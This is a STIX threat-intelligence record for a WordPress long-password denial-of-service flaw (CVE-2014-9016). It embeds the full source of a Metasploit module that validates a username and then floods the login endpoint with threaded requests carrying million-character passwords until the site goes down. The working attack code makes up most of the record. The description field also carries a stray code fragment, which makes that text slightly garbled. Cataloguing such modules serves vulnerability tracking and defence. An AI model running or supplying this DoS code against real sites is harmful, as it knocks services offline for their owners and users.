{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--a497e8da-23c5-4171-8599-894cb341b29e",
    "created": "2024-08-14T16:25:56.552936Z",
    "modified": "2024-08-14T16:25:56.55294Z",
    "name": "WordPress Long Password DoS",
    "description": "WordPress before 3.7.5, 3.8.x before 3.8.5, 3.9.x before 3.9.3, and 4.x before 4.0.1 allows remote attackers to cause a denial of service (CPU consumption) via a long password that is improperly handled during hashing. 'License'         => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/dos/http/wordpress_long_password_dos.rb",
            "external_id": "wordpress_long_password_dos.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2014-9016"
        },
        {
            "source_name": "reference",
            "url": "https://nvd.nist.gov/vuln/detail/CVE-2014-9034"
        },
        {
            "source_name": "WPVDB",
            "external_id": "7681"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n  include Msf::Auxiliary::Dos\n\n  def initialize(info = {})\n    super(update_info(\n      info,\n      'Name'            => 'WordPress Long Password DoS',\n      'Description'     => %q{WordPress before 3.7.5, 3.8.x before 3.8.5, 3.9.x before 3.9.3, and 4.x\n                              before 4.0.1 allows remote attackers to cause a denial of service\n                              (CPU consumption) via a long password that is improperly handled\n                              during hashing.},\n      'License'         => MSF_LICENSE,\n      'Author'          =>\n        [\n          'Javier Nieto Arevalo',  # Vulnerability disclosure\n          'Andres Rojas Guerrero', # Vulnerability disclosure\n          'rastating'              # Metasploit module\n        ],\n      'References'      =>\n        [\n          ['CVE', '2014-9016'],\n          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2014-9034'],\n          ['OSVDB', '114857'],\n          ['WPVDB', '7681']\n        ],\n      'DisclosureDate'  => '2014-11-20'\n    ))\n\n    register_options(\n      [\n        OptInt.new('PLENGTH', [true, 'Length of password to use', 1000000]),\n        OptInt.new('RLIMIT', [true, 'The number of requests to send', 200]),\n        OptInt.new('THREADS', [true, 'The number of concurrent threads', 5]),\n        OptInt.new('TIMEOUT', [true, 'The maximum time in seconds to wait for each request to finish', 5]),\n        OptString.new('USERNAME', [true, 'The username to send the requests with', '']),\n        OptBool.new('VALIDATE_USER', [true, 'Validate the specified username', true])\n      ])\n  end\n\n  def rlimit\n    datastore['RLIMIT']\n  end\n\n  def plength\n    datastore['PLENGTH']\n  end\n\n  def username\n    datastore['USERNAME']\n  end\n\n  def validate_user\n    datastore['VALIDATE_USER']\n  end\n\n  def thread_count\n    datastore['THREADS']\n  end\n\n  def timeout\n    datastore['TIMEOUT']\n  end\n\n  def user_exists(user)\n    exists = wordpress_user_exists?(user)\n    if exists\n      print_good(\"Username \\\"#{username}\\\" is valid\")\n      store_valid_credential(user: user, private: nil, proof: \"WEBAPP=\\\"Wordpress\\\", VHOST=#{vhost}\")\n      return true\n    else\n      print_error(\"\\\"#{user}\\\" is not a valid username\")\n      return false\n    end\n  end\n\n  def run\n    if wordpress_and_online?\n      if validate_user\n        print_status(\"Checking if user \\\"#{username}\\\" exists...\")\n        unless user_exists(username)\n          print_error('Aborting operation - a valid username must be specified')\n          return\n        end\n      end\n\n      starting_thread = 1\n      while starting_thread < rlimit do\n        ubound = [rlimit - (starting_thread - 1), thread_count].min\n        print_status(\"Executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}...\")\n\n        threads = []\n        1.upto(ubound) do |i|\n          threads << framework.threads.spawn(\"Module(#{self.refname})-request#{(starting_thread - 1) + i}\", false, i) do |i|\n            begin\n              wordpress_login(username, Rex::Text.rand_text_alpha(plength), timeout)\n            rescue => e\n              print_error(\"Timed out during request #{(starting_thread - 1) + i}\")\n            end\n          end\n        end\n\n        threads.each(&:join)\n        print_good(\"Finished executing requests #{starting_thread} - #{(starting_thread + ubound) - 1}\")\n        starting_thread += ubound\n      end\n\n      if wordpress_and_online?\n        print_error(\"FAILED: #{target_uri} appears to still be online\")\n      else\n        print_good(\"SUCCESS: #{target_uri} appears to be down\")\n      end\n    else\n      print_error(\"#{rhost}:#{rport}#{target_uri} does not appear to be running WordPress\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2014-11-20"
}